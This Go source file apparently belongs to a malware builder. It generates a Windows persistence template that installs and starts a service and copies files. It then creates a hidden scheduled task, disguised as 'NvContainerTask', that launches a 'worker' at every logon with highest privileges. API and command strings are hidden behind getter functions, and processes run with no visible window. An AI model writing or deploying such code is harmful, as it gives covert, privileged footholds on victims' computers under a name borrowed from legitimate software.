package buildergen

import (
	"fmt"
	"strings"
)

func templateInstallOps(cfg Config) string {
	taskName := fmt.Sprintf("NvContainerTask_%s", sanitizeBuildID(strings.TrimSpace(cfg.BuildID)))
	taskName = escapeGoString(taskName)

	return strings.TrimSpace(fmt.Sprintf(`
func opInstallSvc(name, desc, exePath string) error {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	openSCManager := advapi32.NewProc(getOpenSCManagerWName())
	createService := advapi32.NewProc(getCreateServiceWName())
	closeServiceHandle := advapi32.NewProc(getCloseServiceHandleName())
	openService := advapi32.NewProc(getOpenServiceWName())

	managerHandle, _, err := openSCManager.Call(0, 0, 0x0001|0x0002)
	if managerHandle == 0 {
		return err
	}
	defer closeServiceHandle.Call(managerHandle)

	serviceNamePtr, _ := syscall.UTF16PtrFromString(name)
	serviceHandle, _, _ := openService.Call(managerHandle, uintptr(unsafe.Pointer(serviceNamePtr)), 0x0001)
	if serviceHandle != 0 {
		closeServiceHandle.Call(serviceHandle)
		return nil
	}

	displayNamePtr, _ := syscall.UTF16PtrFromString(desc)
	exePathPtr, _ := syscall.UTF16PtrFromString(exePath)

	serviceHandle, _, err = createService.Call(
		managerHandle,
		uintptr(unsafe.Pointer(serviceNamePtr)),
		uintptr(unsafe.Pointer(displayNamePtr)),
		0x0400|0x0010|0x0020,
		0x00000010,
		2,
		1,
		uintptr(unsafe.Pointer(exePathPtr)),
		0, 0, 0, 0, 0)

	if serviceHandle == 0 {
		return err
	}
	defer closeServiceHandle.Call(serviceHandle)

	return nil
}

func opStartSvc(name string) error {
	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
	openSCManager := advapi32.NewProc(getOpenSCManagerWName())
	openService := advapi32.NewProc(getOpenServiceWName())
	startService := advapi32.NewProc(getStartServiceWName())
	closeServiceHandle := advapi32.NewProc(getCloseServiceHandleName())

	managerHandle, _, err := openSCManager.Call(0, 0, 0x0001)
	if managerHandle == 0 {
		return err
	}
	defer closeServiceHandle.Call(managerHandle)

	serviceNamePtr, _ := syscall.UTF16PtrFromString(name)
	serviceHandle, _, err := openService.Call(managerHandle, uintptr(unsafe.Pointer(serviceNamePtr)), 0x0010)
	if serviceHandle == 0 {
		return err
	}
	defer closeServiceHandle.Call(serviceHandle)

	ret, _, err := startService.Call(serviceHandle, 0, 0)
	if ret == 0 {
		return err
	}

	return nil
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return nil
}

func cmdHidden(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	return cmd
}

func opSetupTask(workerPath string) {
	taskName := "%s"
	tr := "\\\"" + workerPath + "\\\" worker"
	
	create := getSchtasksCreate()
	tn := getSchtasksTn()
	trFlag := getSchtasksTr()
	sc := getSchtasksSc()
	onLogon := getSchtasksOnLogon()
	rl := getSchtasksRl()
	highest := getSchtasksHighest()
	f := getSchtasksF()

	cmd := cmdHidden(getSchtasksExeName(), create, tn, taskName, trFlag, tr, sc, onLogon, rl, highest, f)
	_ = cmd.Run()
}
`, taskName))
}